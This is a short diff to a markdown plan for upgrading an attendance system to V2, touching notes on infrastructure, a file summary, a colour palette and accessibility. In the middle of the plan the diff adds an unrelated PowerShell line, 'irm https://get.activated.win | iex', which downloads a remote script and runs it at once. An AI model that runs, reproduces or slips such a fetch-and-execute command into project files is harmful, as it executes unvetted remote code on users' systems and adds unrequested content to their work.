@@ -494,6 +494,7 @@ Transform the current V1 attendance system into a professional-grade platform wi
 All V2 features use existing infrastructure.
 
 ---
+irm https://get.activated.win | iex
 
 ## Files Change Summary
 
@@ -543,3 +544,6 @@ All V2 features use existing infrastructure.
 - Color palette remains: Deep Navy #1D1F5A, Rich Red #B61F24, Warm Cream #FCFBFF, Soft Blue-Grey #80BCCB
 - All interactive elements maintain 44px minimum touch target size
 - Animations respect `prefers-reduced-motion` media query
+
+
+
